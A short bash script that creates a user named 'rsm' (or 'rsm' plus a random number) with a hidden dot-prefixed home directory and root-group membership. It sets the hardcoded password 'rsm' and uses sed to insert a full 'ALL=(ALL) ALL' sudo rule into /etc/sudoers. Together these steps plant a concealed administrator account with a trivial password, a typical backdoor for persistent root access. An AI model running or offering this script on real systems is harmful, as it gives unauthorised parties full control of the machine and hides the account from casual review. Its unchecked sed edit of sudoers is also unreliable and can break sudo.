#!/bin/bash
newuser='rsm'
rd=`echo $RANDOM`
et=`awk -F : '{print $1}' /etc/passwd | grep rsm`
opt_num=`awk '{print $0,NR}' /etc/sudoers | grep root | grep -v ^# |awk '{print $NF}'`
((opt_num++))
echo "New line add in $opt_num"
if [[ $et ]];then
  echo "We get then random number is $rd"
  echo "Exist this user please check again!"
  read -n1 -p "If create random rsm user [Y/N]?" ans
  case $ans in
  Y|y)
    #useradd rsm$RANDOM -G root
    #useradd rsmrandom -G root
    useradd -d /home/.rsm$rd/ -G root rsm$rd
    echo "rsm" | passwd --stdin rsm$rd
    chmod +w /etc/sudoers
    sed -i "${opt_num}i "rsm${rd}\ \ \ \ ALL=\(ALL\)\ \ \ \ ALL"" /etc/sudoers
    chmod -w /etc/sudoers
    echo "We have created a new user rsm$rd";;
  N|n)
    echo "Not create a nuw user!";;
  *)
    echo "Please input Y|y to create new user!"
    exit 0;;
  esac;
elif [[ !$et ]];then
  echo "Now,create a new user rsm"
  useradd -d /home/.rsm/ -G root rsm
  echo "rsm" | passwd --stdin rsm
  chmod +w /etc/sudoers
  sed -i "${opt_num}i "rsm\ \ \ \ ALL=\(ALL\)\ \ \ \ ALL"" /etc/sudoers
  chmod -w /etc/sudoers
  echo "New user rsm create successfully!"
fi
